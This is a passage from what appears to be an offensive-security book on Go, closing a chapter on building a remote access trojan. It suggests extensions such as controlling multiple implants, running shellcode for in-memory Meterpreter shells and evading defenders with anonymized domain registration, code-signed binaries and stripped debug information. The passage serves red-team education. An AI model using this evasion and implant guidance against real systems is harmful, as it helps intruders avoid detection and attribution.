<h4 class="h4" id="ch14lev2sec9">Support Multiple Implants</h4>&#13;
<p class="noindent">Realistically, you’ll want to support multiple simultaneous implants polling your server for work. This would make your RAT significantly more useful, because it could manage more than a single implant, but it requires pretty significant changes as well.</p>&#13;
<p class="indent">That’s because, when you wish to execute a command on an implant, you’ll likely want to execute it on a single specific implant, not the first one that polls the server for work. You could rely on the implant ID created during registration to keep the implants mutually exclusive, and to direct commands and output appropriately. Implement this functionality so that you can explicitly choose the destination implant on which the command should be run.</p>&#13;
<p class="indent">Further complicating this logic, you’ll need to consider that you might have multiple admin operators sending commands out simultaneously, as is common when working with a team. This means that you’ll probably want to convert your <code>work</code> and <code>output</code> channels from unbuffered to buffered types. This will help keep execution from blocking when there are multiple messages in-flight. However, to support this sort of multiplexing, you’ll need to implement a mechanism that can match a requestor with its proper response. For example, if two admin operators send work simultaneously to implants, the implants will generate two separate responses. If operator 1 sends the <code>ls</code> command and operator 2 sends the <code>ifconfig</code> command, it wouldn’t be appropriate for operator 1 to receive the command output for <code>ifconfig</code>, and vice versa.</p>&#13;
<h4 class="h4" id="ch14lev2sec10"><span epub:type="pagebreak" id="page_329"/>Add Implant Functionality</h4>&#13;
<p class="noindent">Our implementation expects the implants to receive and run operating system commands only. However, other C2 software contains a lot of other convenience functions that would be nice to have. For example, it would be nice to be able to upload or download files to and from our implants. It might be nice to run raw shellcode, in the event we want to, for example, spawn a Meterpreter shell without touching disk. Extend the current functionality to support these additional features.</p>&#13;
<h4 class="h4" id="ch14lev2sec11">Chain Operating System Commands</h4>&#13;
<p class="noindent">Because of the way Go’s <code>os/exec</code> package creates and runs commands, you can’t currently pipe the output of one command as input into a second command. For example, this won’t work in our current implementation: <code>ls -la | wc -l.</code> To fix this, you’ll need to play around with the command variable, which is created when you call <code>exec.Command()</code> to create the command instance. You can alter the stdin and stdout properties to redirect them appropriately. When used in conjunction with an <code>io.Pipe</code>, you can force the output of one command (<code>ls -la</code>, for example) to act as the input into a subsequent command (<code>wc -l</code>).</p>&#13;
<h4 class="h4" id="ch14lev2sec12">Enhance the Implant’s Authenticity and Practice Good OPSEC</h4>&#13;
<p class="noindent">When you added encrypted communications to the implant in the first exercise in this section, did you use a self-signed certificate? If so, the transport and backend server may arouse suspicion in devices and inspecting proxies. Instead, register a domain name by using private or anonymized contact details in conjunction with a certificate authority service to create a legitimate certificate. Further, if you have the means to do so, consider obtaining a code-signing certificate to sign your implant binary.</p>&#13;
<p class="indent">Additionally, consider revising the naming scheme for your source code locations. When you build your binary file, the file will include package paths. Descriptive pathnames may lead incident responders back to you. Further, when building your binary, consider removing debugging information. This has the added benefit of making your binary size smaller and more difficult to disassemble. The following command can achieve this:</p>&#13;
<pre>$ <span class="codestrong1">go build -ldflags="-s -w" implant/implant.go</span></pre>&#13;
<p class="indent">These flags are passed to the linker to remove debugging information and strip the binary.</p>&#13;
<h4 class="h4" id="ch14lev2sec13">Add ASCII Art</h4>&#13;
<p class="noindent">Your implementation could be a hot mess, but if it has ASCII art, it’s legitimate. Okay, we’re not serious about that. But every security tool seems to have ASCII art for some reason, so maybe you should add it to yours. Greetz optional.</p>&#13;
<h3 class="h3" id="ch14lev1sec8"><span epub:type="pagebreak" id="page_330"/>Summary</h3>&#13;
<p class="noindent">Go is a great language for writing cross-platform implants, like the RAT you built in this chapter. Creating the implant was likely the most difficult part of this project, because using Go to interact with the underlying operating system can be challenging compared to languages designed for the operating system API, such as C# and the Windows API. Additionally, because Go builds to a statically compiled binary, implants may result in a large binary size, which may add some restrictions on delivery.</p>&#13;
<p class="indent">But for backend services, there is simply nothing better. One of the authors of this book (Tom) has an ongoing bet with another author (Dan) that if he ever switches from using Go for backend services and general utility, he’ll have to pay $10,000. There is no sign of him switching anytime soon (although Elixir looks cool). Using all the techniques described in this book, you should have a solid foundation to start building some robust frameworks and utilities.</p>&#13;
<p class="indent">We hope you enjoyed reading this book and participating in the exercises as much as we did writing it. We encourage you to keep writing Go and use the skills learned in this book to build small utilities that enhance or replace your current tasks. Then, as you gain experience, start working on larger codebases and build some awesome projects. To continue growing your skills, look at some of the more popular large Go projects, particularly from large organizations. Watch talks from conferences, such as GopherCon, that can guide you through more advanced topics, and have discussions on pitfalls and ways to enhance your programming. Most importantly, have fun—and if you build something neat, tell us about it! Catch you on the flippity-flip.</p>&#13;
</div>



  </body></html>